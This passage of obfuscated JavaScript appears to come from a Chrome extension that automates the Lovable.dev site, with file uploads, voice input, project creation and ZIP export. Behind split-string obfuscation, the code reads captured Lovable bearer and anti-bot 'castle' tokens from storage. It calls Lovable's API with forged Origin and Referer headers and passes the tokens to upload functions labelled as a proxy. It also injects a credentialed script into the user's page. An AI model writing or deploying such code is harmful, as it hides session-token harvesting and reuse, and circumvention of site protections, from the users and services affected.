'method':'POS'+'T','headers':_n30a104,'body':JSON['str'+'ing'+'ify'](_n3de572)}
);
if(!_n27c505||_n27c505['err'+'or'])throw new Error(_n27c505&&_n27c505['err'+'or']?_n27c505['err'+'or']:'Upl'+'oad'+'\x20fa'+'lho'+'u');
if(!_n27c505['fil'+'e_i'+'d'])throw new Error('fil'+'e_i'+'d\x20n'+'ão\x20'+'ret'+'orn'+'ado'+'\x20pe'+'lo\x20'+'pro'+'xy');
const _n1b7aa3={
}
;
return _n1b7aa3['fil'+'e_i'+'d']=_n27c505['fil'+'e_i'+'d'],_n1b7aa3['fil'+'e_n'+'ame']=_n27c505['fil'+'e_n'+'ame']||_n2e906f['nam'+'e'],_n1b7aa3['dow'+'nlo'+'ad_'+'url']=_n27c505['dow'+'nlo'+'ad_'+'url']||null,_n1b7aa3['mim'+'e_t'+'ype']=_n27c505['mim'+'e_t'+'ype']||_n9109d,_n1b7aa3;
}
function _n1eeb71(){
const _n314740=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'att'+'ach'+'-pr'+'evi'+'ew');
if(!_n314740)return;
if(_ne62fcc['len'+'gth']===0x0){
_n314740['sty'+'le']['dis'+'pla'+'y']='non'+'e',_n314740['inn'+'erH'+'TML']='';
return;
}
_n314740['sty'+'le']['dis'+'pla'+'y']='fle'+'x',_n314740['inn'+'erH'+'TML']=_ne62fcc['map']((_n338e6a,_n5aaeef)=>spTemplateAttachItem(_n338e6a,_n5aaeef))['joi'+'n'](''),_n314740['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('.sp'+'-at'+'tac'+'h-r'+'emo'+'ve')['for'+'Eac'+'h'](_n2ae04d=>{
_n2ae04d['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n196935=>{
_n196935['sto'+'pPr'+'opa'+'gat'+'ion']();
const _nefe698=parseInt(_n2ae04d['get'+'Att'+'rib'+'ute']('dat'+'a-i'+'dx'));
if(_ne62fcc[_nefe698]&&_ne62fcc[_nefe698]['pre'+'vie'+'wUr'+'l'])URL['rev'+'oke'+'Obj'+'ect'+'URL'](_ne62fcc[_nefe698]['pre'+'vie'+'wUr'+'l']);
_ne62fcc['spl'+'ice'](_nefe698,0x1),_n1eeb71();
}
);
}
);
}
async function _n1f5517(_n41b9bd){
if(!_n41b9bd||!_n41b9bd['len'+'gth'])return;
await new Promise(_n39acc6=>_n5e6fc4(()=>_n39acc6()));
let _n48765f=_n39b796||'',_n86b611=_n2b5999||'';
(!_n48765f||!_n86b611)&&(await new Promise(_n411e66=>setTimeout(_n411e66,0x1f4)),await new Promise(_n46e3ce=>_n5e6fc4(()=>_n46e3ce())),_n48765f=_n39b796||'',_n86b611=_n2b5999||'');
(!_n48765f||!_n86b611)&&(await new Promise(_n1e9b8d=>_n2b6173(()=>_n1e9b8d())),_n48765f=_n39b796||'',_n86b611=_n2b5999||'');
if(_n48765f['sta'+'rts'+'Wit'+'h']('Bea'+'rer'+'\x20'))_n48765f=_n48765f['sli'+'ce'](0x7);
if(!_n48765f||!_n86b611){
_n3921c7(spT('err'+'_no'+'_to'+'ken'));
return;
}
_ne62fcc=_ne62fcc['fil'+'ter'](_ndd9997=>!_ndd9997['upl'+'oad'+'Fai'+'led']);
for(const _n32121c of _n41b9bd){
if(_ne62fcc['len'+'gth']>=_n3d6cca)break;
const _n5b3842=_n32121c['typ'+'e']||'app'+'lic'+'ati'+'on/'+'oct'+'et-'+'str'+'eam',_n3d1269=UploadManager['isI'+'mag'+'eTy'+'pe'](_n5b3842),_n34278b=UploadManager['isV'+'ide'+'oTy'+'pe'](_n5b3842),_n1854d3=URL['cre'+'ate'+'Obj'+'ect'+'URL'](_n32121c),_n3e9c0a={
'uid':crypto['ran'+'dom'+'UUI'+'D'](),'file_name':_n32121c['nam'+'e'],'previewUrl':_n3d1269||_n34278b?_n1854d3:null,'file_type':_n5b3842,'sizeLabel':UploadManager['for'+'mat'+'Fil'+'eSi'+'ze'](_n32121c['siz'+'e']),'uploading':!![],'uploadFailed':![],'rawFile':_n32121c,'publicUrl':null,'file_id':null,'download_url':null,'mime_type':_n5b3842}
;
_ne62fcc['pus'+'h'](_n3e9c0a),_n1eeb71(),(async _n4c093e=>{
try{
const _nbfc622=_n574ee4(_n48765f)||'pub'+'lic';
if(_n48765f&&_n86b611){
const _n4e4502=UploadManager['upl'+'oad'+'Fil'+'e'](_n4c093e['raw'+'Fil'+'e'],_nbfc622)['cat'+'ch'](_n51eea3=>{
return console['war'+'n']('[SP'+'\x20At'+'tac'+'h]\x20'+'Sup'+'aba'+'se\x20'+'par'+'ale'+'lo\x20'+'fal'+'hou'+':',_n51eea3['mes'+'sag'+'e']||_n51eea3),null;
}
);
let _n529492=null;
try{
_n529492=await _n1bd708(_n4c093e['raw'+'Fil'+'e'],_n48765f,_n86b611);
}
catch(_n548c0e){
console['war'+'n']('[SP'+'\x20At'+'tac'+'h]\x20'+'Upl'+'oad'+'\x20di'+'ret'+'o\x20G'+'CS\x20'+'fal'+'hou'+',\x20t'+'ent'+'and'+'o\x20p'+'rox'+'y:',_n548c0e['mes'+'sag'+'e']||_n548c0e);
}
if(!_n529492)try{
_n529492=await _n2c3e47(_n4c093e['raw'+'Fil'+'e'],_n48765f,_n86b611);
}
catch(_n595aa2){
console['war'+'n']('[SP'+'\x20At'+'tac'+'h]\x20'+'Pro'+'xy\x20'+'upl'+'oad'+'\x20GC'+'S\x20f'+'alh'+'ou:',_n595aa2['mes'+'sag'+'e']||_n595aa2);
}
const _n28c178=await _n4e4502;
if(_n529492){
_n4c093e['fil'+'e_i'+'d']=_n529492['fil'+'e_i'+'d'],_n4c093e['mim'+'e_t'+'ype']=_n529492['mim'+'e_t'+'ype']||_n4c093e['fil'+'e_t'+'ype'],_n4c093e['pub'+'lic'+'Url']=_n28c178||null,_n4c093e['dow'+'nlo'+'ad_'+'url']=_n529492['dow'+'nlo'+'ad_'+'url']||null;
if(_n4c093e['fil'+'e_i'+'d']&&!_n4c093e['dow'+'nlo'+'ad_'+'url']){
console['war'+'n']('[SP'+'\x20At'+'tac'+'h]\x20'+'⚠\x20f'+'ile'+'_id'+'\x20ok'+'\x20ma'+'s\x20d'+'own'+'loa'+'d_u'+'rl\x20'+'nul'+'l\x20—'+'\x20re'+'try'+'\x20em'+'\x202s'+'...'),await new Promise(_n3241ff=>setTimeout(_n3241ff,0x7d0));
try{
const _n2e8654={
}
;
_n2e8654['Con'+'ten'+'t-T'+'ype']='app'+'lic'+'ati'+'on/'+'jso'+'n',_n2e8654['Aut'+'hor'+'iza'+'tio'+'n']='Bea'+'rer'+'\x20'+_n48765f,_n2e8654['Acc'+'ept']='*/*',_n2e8654['Ori'+'gin']='htt'+'ps:'+'//l'+'ova'+'ble'+'.de'+'v',_n2e8654['Ref'+'ere'+'r']='htt'+'ps:'+'//l'+'ova'+'ble'+'.de'+'v/';
const _n5c8e2b=_n2e8654;
if(_n86b611)_n5c8e2b['x-l'+'ova'+'ble'+'-pr'+'oje'+'ct-'+'id']=_n86b611;
const _n382749=_n4c093e['fil'+'e_i'+'d']?String(_n4c093e['fil'+'e_i'+'d'])['spl'+'it']('/')['pop']():_n4c093e['fil'+'e_i'+'d'],_n581074={
}
;
_n581074['dir'+'_na'+'me']=_n86b611||_n2b5999,_n581074['fil'+'e_n'+'ame']=_n382749;
const _n36b970=await _n530b76('htt'+'ps:'+'//a'+'pi.'+'lov'+'abl'+'e.d'+'ev/'+'fil'+'es/'+'gen'+'era'+'te-'+'dow'+'nlo'+'ad-'+'url',{
'method':'POS'+'T','headers':_n5c8e2b,'body':JSON['str'+'ing'+'ify'](_n581074)}
),_n31e5b1=_n36b970&&(_n36b970['url']||_n36b970['dow'+'nlo'+'ad_'+'url']||_n36b970['sig'+'ned'+'_ur'+'l']||_n36b970['sig'+'ned'+'Url'])||null;
_n31e5b1?(_n4c093e['dow'+'nlo'+'ad_'+'url']=_n31e5b1,console['log']('[SP'+'\x20At'+'tac'+'h]\x20'+'✅\x20d'+'own'+'loa'+'d_u'+'rl\x20'+'(GC'+'S)\x20'+'rec'+'upe'+'rad'+'a\x20n'+'o\x20r'+'etr'+'y\x20f'+'ina'+'l')):console['war'+'n']('[SP'+'\x20At'+'tac'+'h]\x20'+'❌\x20d'+'own'+'loa'+'d_u'+'rl\x20'+'per'+'man'+'ece'+'\x20nu'+'ll\x20'+'—\x20i'+'mag'+'em\x20'+'pod'+'e\x20n'+'ão\x20'+'fic'+'ar\x20'+'vis'+'íve'+'l');
}
catch(_n3bc890){
console['war'+'n']('[SP'+'\x20At'+'tac'+'h]\x20'+'ret'+'ry\x20'+'fin'+'al\x20'+'dow'+'nlo'+'ad-'+'url'+'\x20fa'+'lho'+'u:',_n3bc890&&_n3bc890['mes'+'sag'+'e']);
}
}
}
else _n28c178&&(_n4c093e['pub'+'lic'+'Url']=_n28c178,_n4c093e['dow'+'nlo'+'ad_'+'url']=_n28c178,_n4c093e['upl'+'oad'+'edT'+'oOw'+'nSt'+'ora'+'ge']=!![]);
}
else try{
_n4c093e['pub'+'lic'+'Url']=await UploadManager['upl'+'oad'+'Fil'+'e'](_n4c093e['raw'+'Fil'+'e'],_nbfc622),_n4c093e['dow'+'nlo'+'ad_'+'url']=_n4c093e['pub'+'lic'+'Url'],_n4c093e['upl'+'oad'+'edT'+'oOw'+'nSt'+'ora'+'ge']=!![];
}
catch(_n2c6a84){
console['war'+'n']('[SP'+'\x20At'+'tac'+'h]\x20'+'Upl'+'oad'+'\x20Su'+'pab'+'ase'+'\x20(s'+'em\x20'+'tok'+'en)'+'\x20fa'+'lho'+'u:',_n2c6a84['mes'+'sag'+'e']||_n2c6a84);
}
_n4c093e['upl'+'oad'+'ing']=![],!_n4c093e['fil'+'e_i'+'d']&&!_n4c093e['pub'+'lic'+'Url']&&(_n4c093e['upl'+'oad'+'Fai'+'led']=!![],_n3921c7(spT('err'+'_up'+'loa'+'d_f'+'ail'+'ed_'+'con'+'n')['rep'+'lac'+'e']('{
fi'+'le}
',_n4c093e['fil'+'e_n'+'ame'])));
}
catch(_n482d0d){
console['err'+'or']('[SP'+'\x20At'+'tac'+'h]\x20'+'Err'+'o\x20i'+'nes'+'per'+'ado'+'\x20no'+'\x20up'+'loa'+'d:',_n482d0d['mes'+'sag'+'e']||_n482d0d),_n4c093e['upl'+'oad'+'ing']=![],_n4c093e['upl'+'oad'+'Fai'+'led']=!![],_n3921c7(spT('err'+'_up'+'loa'+'d_f'+'ail'+'ed_'+'pro'+'jec'+'t')['rep'+'lac'+'e']('{
fi'+'le}
',_n4c093e['fil'+'e_n'+'ame']));
}
finally{
_n1eeb71(),!_ne62fcc['som'+'e'](_n242788=>_n242788['upl'+'oad'+'ing'])&&(_n10870e=Date['now']()),chrome['sto'+'rag'+'e']['loc'+'al']['set']({
'ql_current_attachments':_ne62fcc['map'](_n3247f6=>({
'url':_n3247f6['pub'+'lic'+'Url'],'name':_n3247f6['fil'+'e_n'+'ame'],'type':_n3247f6['fil'+'e_t'+'ype']}
))}
);
}
}
)(_n3e9c0a);
}
}
function _n34e835(){
const _n2256e6=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'fil'+'e-i'+'npu'+'t'),_n40024b=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'dro'+'p-z'+'one'),_n35c51a=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'dro'+'p-o'+'ver'+'lay');
if(!_n2256e6)return;
_n2256e6['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cha'+'nge',async()=>{
const _n43762b=Array['fro'+'m'](_n2256e6['fil'+'es']||[]);
_n2256e6['val'+'ue']='';
if(_n43762b['len'+'gth'])await _n1f5517(_n43762b);
}
);
if(_n40024b&&_n35c51a){
let _n31086e=0x0;
_n40024b['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gen'+'ter',_n32a043=>{
_n32a043['pre'+'ven'+'tDe'+'fau'+'lt'](),_n32a043['sto'+'pPr'+'opa'+'gat'+'ion'](),_n31086e++;
if(_n31086e===0x1)_n35c51a['sty'+'le']['dis'+'pla'+'y']='fle'+'x';
}
),_n40024b['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gov'+'er',_n2f4cf6=>{
_n2f4cf6['pre'+'ven'+'tDe'+'fau'+'lt'](),_n2f4cf6['sto'+'pPr'+'opa'+'gat'+'ion'](),_n2f4cf6['dat'+'aTr'+'ans'+'fer']['dro'+'pEf'+'fec'+'t']='cop'+'y';
}
),_n40024b['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gle'+'ave',_n4f7ecb=>{
_n4f7ecb['pre'+'ven'+'tDe'+'fau'+'lt'](),_n4f7ecb['sto'+'pPr'+'opa'+'gat'+'ion'](),_n31086e--,_n31086e<=0x0&&(_n31086e=0x0,_n35c51a['sty'+'le']['dis'+'pla'+'y']='non'+'e');
}
),_n40024b['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('dro'+'p',async _n5e908b=>{
_n5e908b['pre'+'ven'+'tDe'+'fau'+'lt'](),_n5e908b['sto'+'pPr'+'opa'+'gat'+'ion'](),_n31086e=0x0,_n35c51a['sty'+'le']['dis'+'pla'+'y']='non'+'e';
if(_n5e908b['dat'+'aTr'+'ans'+'fer']?.['fil'+'es']?.['len'+'gth'])await _n1f5517(Array['fro'+'m'](_n5e908b['dat'+'aTr'+'ans'+'fer']['fil'+'es']));
}
);
}
}
function _n5e344d(_n2771c2){
return new Promise((_n4f734c,_n4583a9)=>{
const _n47d3a4=new FileReader();
_n47d3a4['onl'+'oad']=()=>{
const _n996a0b=_n47d3a4['res'+'ult']['spl'+'it'](',')[0x1];
_n4f734c(_n996a0b);
}
,_n47d3a4['one'+'rro'+'r']=()=>_n4583a9(new Error('Fal'+'ha\x20'+'ao\x20'+'ler'+'\x20ar'+'qui'+'vo')),_n47d3a4['rea'+'dAs'+'Dat'+'aUR'+'L'](_n2771c2);
}
);
}
function _n379ade(){
const _n2d3da5=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'spe'+'ech');
if(!_n2d3da5)return;
const _n2b5310=window['Spe'+'ech'+'Rec'+'ogn'+'iti'+'on']||window['web'+'kit'+'Spe'+'ech'+'Rec'+'ogn'+'iti'+'on'];
if(!_n2b5310){
_n2d3da5['tit'+'le']='Rec'+'onh'+'eci'+'men'+'to\x20'+'de\x20'+'voz'+'\x20nã'+'o\x20s'+'upo'+'rta'+'do\x20'+'nes'+'te\x20'+'nav'+'ega'+'dor',_n2d3da5['sty'+'le']['opa'+'cit'+'y']='0.4',_n2d3da5['sty'+'le']['cur'+'sor']='not'+'-al'+'low'+'ed';
return;
}
let _n363d2e=null,_n207465=![];
function _n4f1d00(){
if(_n363d2e)_n363d2e['sto'+'p']();
_n363d2e=new _n2b5310(),_n363d2e['lan'+'g']='pt-'+'BR',_n363d2e['con'+'tin'+'uou'+'s']=!![],_n363d2e['int'+'eri'+'mRe'+'sul'+'ts']=!![],_n363d2e['max'+'Alt'+'ern'+'ati'+'ves']=0x1;
let _n441e95='';
const _n4d1db6=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'msg');
_n363d2e['ons'+'tar'+'t']=()=>{
_n207465=!![],_n2d3da5['cla'+'ssL'+'ist']['add']('ql-'+'rec'+'ord'+'ing'),_n441e95=_n4d1db6?_n4d1db6['val'+'ue']:'',_n2d3da5['tit'+'le']='Gra'+'van'+'do.'+'..\x20'+'cli'+'que'+'\x20pa'+'ra\x20'+'par'+'ar',console['log']('[Hy'+'per'+'Bui'+'ld]'+'\x20Gr'+'ava'+'ção'+'\x20de'+'\x20vo'+'z\x20i'+'nic'+'iad'+'a');
}
,_n363d2e['onr'+'esu'+'lt']=_n23b651=>{
let _n1cd082='';
for(let _n103d85=_n23b651['res'+'ult'+'Ind'+'ex'];
_n103d85<_n23b651['res'+'ult'+'s']['len'+'gth'];
_n103d85++){
const _n2ce701=_n23b651['res'+'ult'+'s'][_n103d85][0x0]['tra'+'nsc'+'rip'+'t'];
if(_n23b651['res'+'ult'+'s'][_n103d85]['isF'+'ina'+'l'])_n441e95+=_n2ce701+'\x20';
else _n1cd082+=_n2ce701;
}
if(_n4d1db6){
_n4d1db6['val'+'ue']=_n441e95+_n1cd082;
const _n4287cc={
}
;
_n4287cc['bub'+'ble'+'s']=!![],_n4d1db6['dis'+'pat'+'chE'+'ven'+'t'](new Event('inp'+'ut',_n4287cc));
}
}
,_n363d2e['one'+'rro'+'r']=_n20b3a5=>{
console['err'+'or']('[Hy'+'per'+'Bui'+'ld]'+'\x20Er'+'ro\x20'+'de\x20'+'voz'+':',_n20b3a5['err'+'or']),_n207465=![],_n2d3da5['cla'+'ssL'+'ist']['rem'+'ove']('ql-'+'rec'+'ord'+'ing'),_n2d3da5['tit'+'le']='Cli'+'que'+'\x20pa'+'ra\x20'+'fal'+'ar';
let _n5e62e8='';
switch(_n20b3a5['err'+'or']){
case'not'+'-al'+'low'+'ed':_n5e62e8='Per'+'mis'+'são'+'\x20do'+'\x20mi'+'cro'+'fon'+'e\x20n'+'ega'+'da.'+'\x20Ve'+'rif'+'iqu'+'e\x20a'+'s\x20c'+'onf'+'igu'+'raç'+'ões'+'\x20do'+'\x20na'+'veg'+'ado'+'r.';
break;
case'no-'+'spe'+'ech':_n5e62e8='Nen'+'hum'+'a\x20f'+'ala'+'\x20de'+'tec'+'tad'+'a.\x20'+'Ten'+'te\x20'+'nov'+'ame'+'nte'+'.';
break;
case'aud'+'io-'+'cap'+'tur'+'e':_n5e62e8='Nen'+'hum'+'\x20di'+'spo'+'sit'+'ivo'+'\x20de'+'\x20áu'+'dio'+'\x20en'+'con'+'tra'+'do.';
break;
default:_n5e62e8='Err'+'o:\x20'+_n20b3a5['err'+'or'];
}
_n269ea3('Err'+'o\x20d'+'e\x20V'+'oz',_n5e62e8);
}
,_n363d2e['one'+'nd']=()=>{
_n207465=![],_n2d3da5['cla'+'ssL'+'ist']['rem'+'ove']('ql-'+'rec'+'ord'+'ing'),_n2d3da5['tit'+'le']='Cli'+'que'+'\x20pa'+'ra\x20'+'fal'+'ar',console['log']('[Hy'+'per'+'Bui'+'ld]'+'\x20Gr'+'ava'+'ção'+'\x20fi'+'nal'+'iza'+'da');
}
,_n363d2e['sta'+'rt']();
}
function _n2a946d(){
if(_n363d2e&&_n207465)_n363d2e['sto'+'p']();
}
_n2d3da5['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n1ce06f=>{
_n1ce06f['pre'+'ven'+'tDe'+'fau'+'lt'](),_n1ce06f['sto'+'pPr'+'opa'+'gat'+'ion']();
if(_n207465)_n2a946d();
else _n4f1d00();
}
);
}
async function _n962b27(){
const _n3dfec7=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'cre'+'ate'+'-mo'+'dal');
if(!_n3dfec7){
_n2aaf74();
return;
}
const _n538358=await new Promise(_n1c566e=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['lov'+'abl'+'e_c'+'ast'+'le_'+'tok'+'en','lov'+'abl'+'e_c'+'ast'+'le_'+'ts'],_n1c566e)),_n229a40=Date['now']()-(_n538358['lov'+'abl'+'e_c'+'ast'+'le_'+'ts']||0x0),_n478714=!!(_n538358['lov'+'abl'+'e_c'+'ast'+'le_'+'tok'+'en']&&_n229a40<0x1d4c0),_n4610af=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'mod'+'al-'+'tok'+'en-'+'war'+'n'),_nffefb0=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'cre'+'ate'+'-mo'+'dal'+'-co'+'nfi'+'rm');
if(_n4610af)_n4610af['sty'+'le']['dis'+'pla'+'y']=_n478714?'non'+'e':'fle'+'x';
_nffefb0&&(_nffefb0['tex'+'tCo'+'nte'+'nt']=_n478714?'✅\x20C'+'onf'+'irm'+'ar\x20'+'—\x20C'+'ria'+'r\x20P'+'roj'+'eto':'🚀\x20T'+'ent'+'ar\x20'+'mes'+'mo\x20'+'ass'+'im',_nffefb0['sty'+'le']['bac'+'kgr'+'oun'+'d']=_n478714?'lin'+'ear'+'-gr'+'adi'+'ent'+'(13'+'5de'+'g,#'+'7c3'+'aed'+',#a'+'855'+'f7)':'lin'+'ear'+'-gr'+'adi'+'ent'+'(13'+'5de'+'g,#'+'b45'+'309'+',#d'+'977'+'06)');
_n3dfec7['cla'+'ssL'+'ist']['add']('sp-'+'mod'+'al-'+'ope'+'n');
const _n18511e=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'cre'+'ate'+'-mo'+'dal'+'-ca'+'nce'+'l');
function _n5829a8(){
_n3dfec7['cla'+'ssL'+'ist']['rem'+'ove']('sp-'+'mod'+'al-'+'ope'+'n'),_n18511e['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n192341),_nffefb0['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n81ab82);
}
function _n192341(){
_n5829a8();
}
function _n81ab82(){
_n5829a8(),_n2aaf74();
}
_n18511e['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n192341),_nffefb0['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n81ab82);
}
async function _n2aaf74(){
const _n2d84ab=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'cre'+'ate'+'-pr'+'oje'+'ct-'+'btn');
if(!_n2d84ab)return;
const _ne637d0=_n2d84ab['inn'+'erH'+'TML'];
_n2d84ab['dis'+'abl'+'ed']=!![],_n2d84ab['inn'+'erH'+'TML']='<sp'+'an>'+'⏳</'+'spa'+'n>\x20'+'Cri'+'and'+'o..'+'.';
try{
const _n4e2ccd=await new Promise(_n264e9a=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['lov'+'abl'+'e_t'+'oke'+'n','lov'+'_ht'],_n264e9a));
let _n3ac34f=_n39b796||_n4e2ccd['lov'+'abl'+'e_t'+'oke'+'n']||_n4e2ccd['lov'+'_ht']||'';
if(_n3ac34f['sta'+'rts'+'Wit'+'h']('Bea'+'rer'+'\x20'))_n3ac34f=_n3ac34f['sli'+'ce'](0x7);
if(!_n3ac34f){
_n400ca0('⚠\x20A'+'bra'+'\x20qu'+'alq'+'uer'+'\x20pr'+'oje'+'to\x20'+'no\x20'+'Lov'+'abl'+'e.d'+'ev\x20'+'pri'+'mei'+'ro\x20'+'par'+'a\x20c'+'apt'+'ura'+'r\x20o'+'\x20to'+'ken'+',\x20d'+'epo'+'is\x20'+'cli'+'que'+'\x20em'+'\x20Cr'+'iar'+'\x20Pr'+'oje'+'to.','war'+'n',0x1770);
return;
}
const _n4842ed=await new Promise((_n1f4757,_n27f9f1)=>{
const _n15bc01={
}
;
_n15bc01['act'+'ion']='lov'+'abl'+'eCr'+'eat'+'ePr'+'oje'+'ct',_n15bc01['tok'+'en']=_n3ac34f,chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_n15bc01,_n356a62=>{
if(chrome['run'+'tim'+'e']['las'+'tEr'+'ror'])return _n27f9f1(new Error(chrome['run'+'tim'+'e']['las'+'tEr'+'ror']['mes'+'sag'+'e']));
const _n3e03c1={
}
;
_n3e03c1['err'+'or']='Sem'+'\x20re'+'spo'+'sta'+'\x20do'+'\x20ba'+'ckg'+'rou'+'nd';
const _n13e8c7={
}
;
_n13e8c7['ok']=![],_n13e8c7['sta'+'tus']=0x0,_n13e8c7['dat'+'a']=_n3e03c1,_n1f4757(_n356a62||_n13e8c7);
}
);
}
);
if(_n4842ed['ok']){
const _n2a5e9b=_n4842ed['dat'+'a']&&_n4842ed['dat'+'a']['lin'+'k'];
_n400ca0('✅\x20P'+'roj'+'eto'+'\x20cr'+'iad'+'o!\x20'+'Cli'+'que'+'\x20St'+'op\x20'+'na\x20'+'aba'+'\x20qu'+'e\x20a'+'bri'+'u\x20⏹','ok',0x1770);
if(_n2a5e9b)window['ope'+'n'](_n2a5e9b,'_bl'+'ank');
}
else{
const _n580faa=_n4842ed['sta'+'tus']===0x193&&_n4842ed['dat'+'a']&&_n4842ed['dat'+'a']['typ'+'e']==='cas'+'tle'+'_de'+'nie'+'d',_n5a4493=_n4842ed['sta'+'tus']===0x192||/payment_required|out.?of.?credits/i['tes'+'t'](JSON['str'+'ing'+'ify'](_n4842ed['dat'+'a']||{
}
));
if(_n580faa)_n400ca0('⚠\x20E'+'nvi'+'e\x20q'+'ual'+'que'+'r\x20m'+'ens'+'age'+'m\x20e'+'m\x20u'+'m\x20p'+'roj'+'eto'+'\x20Lo'+'vab'+'le\x20'+'abe'+'rto'+'\x20e\x20'+'ten'+'te\x20'+'cri'+'ar\x20'+'o\x20p'+'roj'+'eto'+'\x20no'+'vam'+'ent'+'e.','war'+'n',0x2328);
else{
if(_n5a4493)_n400ca0(spT('err'+'or_'+'pay'+'men'+'t_r'+'equ'+'ire'+'d'),'err'+'or',0x2710);
else{
const _n2b0ff7=_n4842ed['sta'+'tus']?'\x20(H'+'TTP'+'\x20'+_n4842ed['sta'+'tus']+')':'',_n42e8db=_n4842ed['dat'+'a']&&_n4842ed['dat'+'a']['err'+'or']||JSON['str'+'ing'+'ify'](_n4842ed['dat'+'a']||{
}
);
_n400ca0('✗\x20C'+'ria'+'r\x20p'+'roj'+'eto'+'\x20fa'+'lho'+'u'+_n2b0ff7+':\x20'+_n42e8db['sub'+'str'+'ing'](0x0,0x96),'err'+'or',0x1b58);
}
}
}
}
catch(_n189246){
_n400ca0('✗\x20C'+'ria'+'r\x20p'+'roj'+'eto'+':\x20'+_n189246['mes'+'sag'+'e'],'err'+'or',0x1388);
}
finally{
_n2d84ab['dis'+'abl'+'ed']=![],_n2d84ab['inn'+'erH'+'TML']=_ne637d0;
}
}
async function _n39c771(){
const _n582c43=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'dow'+'nlo'+'ad-'+'zip'+'-bt'+'n');
if(!_n582c43)return;
const _nb196d7=_n582c43['inn'+'erH'+'TML'];
_n582c43['dis'+'abl'+'ed']=!![],_n582c43['inn'+'erH'+'TML']='<sp'+'an>'+'⏳</'+'spa'+'n>\x20'+'Pre'+'par'+'and'+'o\x20Z'+'IP.'+'..';
try{
await new Promise(_nfc3f0a=>_n5e6fc4(()=>_nfc3f0a()));
const _n34b0a1=_n14a310,_nd9f334=_n34b0a1!=null?['lov'+'_to'+'k_'+_n34b0a1,'lov'+'_ht'+'_'+_n34b0a1,'lov'+'_pi'+'d_'+_n34b0a1,'lov'+'abl'+'e_t'+'oke'+'n','lov'+'abl'+'e_p'+'roj'+'ect'+'Id']:['lov'+'abl'+'e_t'+'oke'+'n','lov'+'abl'+'e_p'+'roj'+'ect'+'Id'],_n32736f=await new Promise(_n57411a=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](_nd9f334,_n57411a));
let _n1b8e93=(_n34b0a1!=null?_n32736f['lov'+'_to'+'k_'+_n34b0a1]||_n32736f['lov'+'_ht'+'_'+_n34b0a1]:null)||_n32736f['lov'+'abl'+'e_t'+'oke'+'n']||_n39b796||'',_n5aca0e=(_n34b0a1!=null?_n32736f['lov'+'_pi'+'d_'+_n34b0a1]:null)||_n32736f['lov'+'abl'+'e_p'+'roj'+'ect'+'Id']||_n2b5999||'';
if(_n1b8e93['sta'+'rts'+'Wit'+'h']('Bea'+'rer'+'\x20'))_n1b8e93=_n1b8e93['sli'+'ce'](0x7);
if(!_n5aca0e){
_n400ca0('⚠\x20A'+'bra'+'\x20o\x20'+'pro'+'jet'+'o\x20n'+'o\x20L'+'ova'+'ble'+'\x20e\x20'+'cli'+'que'+'\x20no'+'vam'+'ent'+'e.','war'+'n',0x1388);
return;
}
if(!_n1b8e93){
_n400ca0('⚠\x20T'+'oke'+'n\x20n'+'ão\x20'+'enc'+'ont'+'rad'+'o.\x20'+'Env'+'ie\x20'+'uma'+'\x20me'+'nsa'+'gem'+'\x20no'+'\x20pr'+'oje'+'to\x20'+'e\x20t'+'ent'+'e\x20n'+'ova'+'men'+'te.','war'+'n',0x1770);
return;
}
const _n4c5d07={
}
;
_n4c5d07['act'+'ive']=!![],_n4c5d07['cur'+'ren'+'tWi'+'ndo'+'w']=!![];
const _n33fd1a=_n34b0a1||await new Promise(_n3569bc=>chrome['tab'+'s']['que'+'ry'](_n4c5d07,_n1aa086=>_n3569bc(_n1aa086&&_n1aa086[0x0]&&_n1aa086[0x0]['id'])));
if(!_n33fd1a){
_n400ca0('⚠\x20A'+'ba\x20'+'do\x20'+'Lov'+'abl'+'e\x20n'+'ão\x20'+'enc'+'ont'+'rad'+'a.\x20'+'Abr'+'a\x20o'+'\x20pr'+'oje'+'to\x20'+'e\x20t'+'ent'+'e\x20n'+'ova'+'men'+'te.','war'+'n',0x1388);
return;
}
const _n342c16={
}
;
_n342c16['tab'+'Id']=_n33fd1a;
const _n567040=await chrome['scr'+'ipt'+'ing']['exe'+'cut'+'eSc'+'rip'+'t']({
'target':_n342c16,'world':'MAI'+'N','func':async(_n32f6df,_n167286)=>{
try{
const _n254891=_n167286['sta'+'rts'+'Wit'+'h']('Bea'+'rer'+'\x20')?_n167286:'Bea'+'rer'+'\x20'+_n167286,_n5076a0={
}
;
_n5076a0['Aut'+'hor'+'iza'+'tio'+'n']=_n254891;
const _n33ffe3={
}
;
_n33ffe3['met'+'hod']='GET',_n33ffe3['hea'+'der'+'s']=_n5076a0,_n33ffe3['cre'+'den'+'tia'+'ls']='inc'+'lud'+'e';
